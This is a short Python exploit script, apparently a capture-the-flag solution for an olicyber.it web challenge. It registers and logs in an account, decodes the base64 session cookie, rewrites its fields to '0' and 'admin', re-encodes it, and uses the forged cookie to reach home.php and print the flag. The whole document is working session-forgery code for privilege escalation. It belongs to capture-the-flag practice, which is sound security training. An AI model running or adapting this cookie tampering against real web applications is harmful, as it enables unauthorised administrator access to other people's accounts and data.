import requests, urllib, base64
site = "http://cma.challs.olicyber.it/index.php"
site1 = "http://cma.challs.olicyber.it/home.php"
s = requests.Session()
s.post(site, data={"username":"sas123sas", "password":"sas123sas", "register":"Arruolati"})
s.post(site, data={"username":"sas123sas", "password":"sas123sas", "login":"Log In"})
c = urllib.parse.unquote(s.cookies.get_dict()["session"])
data = base64.b64decode(c).decode().split("-")
data[1] = '0'
data[2] = 'admin'
f = f"{data[0]}-{data[1]}-{data[2]}".encode()
cookie = urllib.parse.quote(base64.b64encode(f))
r = requests.get(site1, cookies={"session":f"{cookie}"})
for i in r.text.split("\n"):
    if "flag" in i:
        print(i.replace(" ", ""), end="")
        break